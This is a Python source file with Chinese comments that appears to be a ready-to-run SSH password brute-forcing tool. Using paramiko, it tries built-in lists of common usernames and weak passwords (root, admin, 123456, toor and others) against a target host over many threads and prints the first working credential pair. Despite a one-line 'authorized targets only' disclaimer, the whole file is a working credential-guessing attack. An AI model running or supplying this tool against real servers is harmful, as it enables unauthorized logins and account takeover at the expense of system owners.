# -*- coding: utf-8 -*-
# 脚本名称: SSH 弱口令爆破（paramiko，多线程/字典）
# 方向: Util / 内网（弱口令）
# 简介: 对 SSH 服务做用户名×密码字典爆破，命中即停，支持单用户/用户字典、
#       端口、超时、线程数、跳板私钥登录验证。仅用于授权靶场/内网自查。
# 用法:
#   python ssh_brute.py 10.10.10.10 -u root -w pass.txt
#   python ssh_brute.py 10.10.10.10 -U users.txt -W pass.txt -p 2222 -t 8
#   python ssh_brute.py --selftest
# 依赖: pip install paramiko
# 注意: 仅对授权目标使用，注意账号锁定策略。
import argparse
import concurrent.futures as cf
import socket
import time

try:
    import paramiko
except Exception:
    paramiko = None

DEFAULT_USERS = ["root", "admin", "ubuntu", "test", "ctf", "user", "oracle",
                 "postgres", "git", "www-data"]
DEFAULT_PASS = ["123456", "root", "password", "admin", "toor", "123456789",
                "root123", "admin123", "12345678", "qwerty", "P@ssw0rd",
                "ctf", "test", "guest", "changeme", "ubuntu", "p@ssw0rd"]


def try_login(host, port, user, pwd, timeout=6):
    cli = paramiko.SSHClient()
    cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cli.connect(host, port=port, username=user, password=pwd,
                    timeout=timeout, banner_timeout=timeout,
                    auth_timeout=timeout, allow_agent=False,
                    look_for_keys=False)
        return True
    except paramiko.AuthenticationException:
        return False
    except (socket.error, paramiko.SSHException, OSError):
        return None
    finally:
        try:
            cli.close()
        except Exception:
            pass


def run(host, users, passwords, port=22, threads=4, timeout=6, delay=0):
    found = []
    stop = False
    lock = cf.thread.Lock() if False else None
    import threading
    tlock = threading.Lock()

    def job(u, p):
        nonlocal stop
        if stop:
            return None
        if delay:
            time.sleep(delay)
        r = try_login(host, port, u, p, timeout)
        if r:
            with tlock:
                stop = True
                found.append((u, p))
                print(f"[+] 命中: {u} : {p}")
        return r

    with cf.ThreadPoolExecutor(threads) as ex:
        futs = []
        for u in users:
            for p in passwords:
                futs.append(ex.submit(job, u, p))
        cf.wait(futs)
    if not found:
        print("[-] 字典未命中（可换更大字典 rockyou/top1000）")
    return found


def selftest():
    if paramiko is None:
        print("[-] 未安装 paramiko，跳过: pip install paramiko"); return
    # 起本地 SSH 不现实，验证参数与默认字典非空、网络异常分支返回 None
    r = try_login("127.0.0.1", 1, "x", "y", timeout=1)
    assert r is None
    print("[+] paramiko 可用，异常处理正常")
    print("[+] selftest OK（真实爆破需可达 SSH 目标）")


def load(arg, default):
    if not arg:
        return default
    if arg.startswith("@") or __import__("os").path.exists(arg):
        return [x.strip() for x in open(arg, encoding="utf-8", errors="replace") if x.strip()]
    return [arg]


def main():
    if paramiko is None:
        print("[!] pip install paramiko"); return
    ap = argparse.ArgumentParser(description="SSH 弱口令爆破（仅授权测试）")
    ap.add_argument("host", nargs="?")
    ap.add_argument("-u", "--user")
    ap.add_argument("-U", "--users")
    ap.add_argument("-w", "--wordlist")
    ap.add_argument("-p", "--port", type=int, default=22)
    ap.add_argument("-t", "--threads", type=int, default=4)
    ap.add_argument("--delay", type=float, default=0)
    ap.add_argument("--selftest", action="store_true")
    a = ap.parse_args()
    if a.selftest:
        selftest(); return
    if not a.host:
        print("[!] 用法: python ssh_brute.py host -u root -w pass.txt"); return
    users = load(a.users or a.user, DEFAULT_USERS)
    pwds = load(a.wordlist, DEFAULT_PASS)
    print(f"[*] {a.host}:{a.port} 用户 {len(users)} 密码 {len(pwds)}")
    run(a.host, users, pwds, a.port, a.threads, delay=a.delay)


if __name__ == "__main__":
    main()
